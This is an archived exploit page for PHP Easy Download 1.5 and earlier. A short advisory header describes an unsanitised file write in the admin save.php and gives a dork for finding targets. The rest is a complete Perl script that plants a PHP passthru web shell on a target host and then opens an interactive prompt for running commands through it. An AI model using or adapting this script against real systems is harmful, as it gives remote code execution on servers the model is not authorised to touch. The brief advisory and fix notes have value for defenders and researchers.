<html><head><title>PHP Easy Download <= 1.5 (save.php) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
# +-------------------------------------------------------------------------------------------
# + PHP Easy Download &lt;= 1.5 Remote Code Execution Vulnerability
# +-------------------------------------------------------------------------------------------
# + Affected Software .: PHP Easy Download &lt;= 1.5
# + Vendor ............: http://www.ironclad.net/
# + Download ..........: http://ironclad.net/scripts/PHP_Easy_Download.zip
# + Description .......: &quot;PHP Easy Download is an easy to use and convenient download script&quot;
# + Dork ..............: &quot;PHP Easy Downloader&quot;
# + Class .............: Remote Code Execution
# + Risk ..............: High (Remote Code Execution)
# + Found By ..........: nuffsaid &lt;nuffsaid[at]newbslove.us&gt;
# +-------------------------------------------------------------------------------------------
# + Details:
# + PHP Easy Download by default installation doesn't prevent any of the files in the
# + file_info/admin directory from being accessed by a client. The file_info/admin/save.php
# + file takes input passed to the script by $_POST and writes it to $_POST[&quot;filename&quot;].0
# + unsanatized in the file_info/admin/descriptions directory.
# +
# + Vulnerable Code: 
# + file_info/admin/save.php, line(s) 14-36:
# + -&gt; 14: $filename = $_POST[&quot;filename&quot;];
# + -&gt; 15: $description = $_POST[&quot;description&quot;];
# + -&gt; 20: $path = &quot;../descriptions/$filename.0&quot;;
# + -&gt; 30: $content = &quot;$accesses|$description|$moreinfo|$date&quot;;
# + -&gt; 34: $newfile = fopen($path,&quot;w&quot;);
# + -&gt; 35: fwrite($newfile, $content);
# + -&gt; 36: fclose($newfile);
# + 
# + Solution:
# + Prevent users from accessing any of the files in the file_info directory (htaccess).
# +-------------------------------------------------------------------------------------------

use Getopt::Long;
use URI::Escape;
use IO::Socket;

$code = &quot;&lt;?php passthru(\$_GET[cmd]); ?&gt;&quot;;

main();

sub usage
{
    print &quot;\nPHP Easy Download &lt;= 1.5 Remote Code Execution Exploit\n&quot;;
    print &quot;-h, --host\ttarget host\t(example.com)\n&quot;;
    print &quot;-f, --file\tshell file\t(shell.php)\n&quot;;
    print &quot;-d, --dir\tinstall dir\t(/file_info)\n&quot;;
    exit;
}

sub main
{
    GetOptions ('h|host=s' =&gt; \$host,'f|file=s' =&gt; \$file,'d|dir=s' =&gt; \$dir);
    usage() unless $host;
    
    $dir = &quot;/file_info&quot; unless $dir;
    $file = &quot;shell.php&quot; unless $file;
    uri_escape($cmd);
    $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;80&quot;)
     or die &quot;\nconnect() failed.\n&quot;;
    
    print &quot;\nconnected to &quot;.$host.&quot;, sending data.\n&quot;;
    $sendurl = &quot;description=0&amp;moreinfo=&quot;.$code.&quot;&amp;accesses=0&amp;filename=&quot;.$file.&quot;&amp;date=&amp;B1=Submit&quot;;
    $sendlen = length($sendurl);
    print $sock &quot;POST &quot;.$dir.&quot;/admin/save.php HTTP/1.1\n&quot;;
    print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
    print $sock &quot;Connection: close\n&quot;;
    print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
    print $sock &quot;Content-Length: &quot;.$sendlen.&quot;\n\n&quot;;
    print $sock $sendurl;
    print &quot;attempted to create php shell, server response:\n\n&quot;;
    while($recvd = &lt;$sock&gt;)
    {
        print &quot; &quot;.$recvd.&quot;&quot;;
    }
    
    while($cmd !~ &quot;~quit&quot;)
    {
        print &quot;\n\n-&gt; &quot;;
        $cmd = &lt;STDIN&gt;;
        if ($cmd !~ &quot;~quit&quot;)
        {
          $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;80&quot;)
           or die &quot;connect() failed.\n&quot;;
          $sendurl = uri_escape($cmd);
          
          print $sock &quot;GET &quot;.$dir.&quot;/descriptions/&quot;.$file.&quot;.0?cmd=&quot;.$sendurl.&quot; HTTP/1.1\n&quot;;
          print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
          print $sock &quot;Accept: */*\n&quot;;
          print $sock &quot;Connection: close\n\n&quot;;
          print &quot;\n&quot;;
          
          while($recvd = &lt;$sock&gt;)
          {
              print $recvd;
          }
        }
    }
    exit;
}

# milw0rm.com [2006-11-18]</pre></html>